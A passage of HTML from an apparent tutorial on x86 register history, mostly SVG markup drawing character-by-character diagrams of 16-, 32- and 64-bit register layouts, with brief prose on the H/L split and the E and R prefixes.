<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='68' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='408' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='100' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='132' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='408' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='164' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='408' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='20' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='416' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='68' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='416' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='100' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='132' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='416' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='164' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='416' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='424' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='432' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='20' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='488' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='496' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='84' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='496' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='116' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='496' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='148' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='180' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<p>These 16-bit registers were partitioned into 2 sections, higher address (H) and lower address (L).</p>
<p>Following that, few years later, 16-bit registers were extended to support 32 bit softwares, adding an <code>E</code> prefix. And after that adding a <code>R</code> prefix for 64 bit registers.</p>
<p>Diagram below shows how these registers are mapped to support previous designs/architectures.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 664 425"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='8' y='340' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='8' y='372' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='8' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='8' y='404' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='16' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='16' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='16' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='388' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='32' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='388' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='40' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='388' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='48' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='388' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='56' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='388' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='64' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='388' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='80' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='388' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='88' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='388' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='96' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='388' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='104' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='388' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='112' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='388' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='120' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='388' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='136' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='388' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='144' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='388' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='388' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='160' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='388' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='168' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='388' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='176' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='388' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='184' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='388' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='200' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='388' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='388' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='216' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='388' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='232' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='388' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='240' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='388' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='256' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='388' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='388' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='272' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='388' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='280' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='388' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='288' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='340' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='304' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='340' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='312' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='228' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='328' y='260' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='328' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='328' y='340' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='328' y='372' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='328' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='404' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='336' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='340' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='344' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='340' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='352' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='340' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='360' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='340' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='376' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='340' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='384' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='392' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='340' fill='currentColor' style='font-size:1em'>X</text>
<text text-anchor='middle' x='400' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='340' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='408' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='228' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='456' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='228' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='464' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='404' fill='currentColor' style='font-size:1em'>─</text>
